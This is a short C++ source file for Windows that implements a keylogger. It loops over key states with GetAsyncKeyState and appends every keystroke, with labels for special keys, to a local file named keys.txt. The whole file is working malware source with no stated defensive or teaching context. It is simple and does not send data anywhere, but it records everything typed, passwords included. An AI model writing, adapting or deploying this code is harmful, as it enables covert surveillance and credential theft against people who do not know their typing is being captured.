#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void startLogging();

int main(){
    
    startLogging();
    return 0; 
}

void startLogging(){
    
    char c;
    while(true){
        for (c = 0; c < 255; c++){
            bool pressed = GetAsyncKeyState(c) & 0x1;
            if (pressed){
                cout << c;
                ofstream keys;
                keys.open("keys.txt", ios::app);
                switch (c) {
                    case VK_BACK:
                        keys << "[backspace]";
                        break;
                    case VK_RETURN:
                        keys << "[enter]";
                        break;
                    case VK_SHIFT:
                        keys << "[shift]";
                        break;
                    case VK_CONTROL:
                        keys << "[ctrl]";
                        break;
                    case VK_CAPITAL:
                        keys << "[caps]";
                        break;
                    case VK_TAB:
                        keys << "[tab]";
                        break;
                    case VK_MENU:
                        keys << "[alt]";
                        break;
                    case VK_LBUTTON:
                        break;
                    case VK_RBUTTON:
                        break;    
                }
                keys << c;
            }
        }
    }
}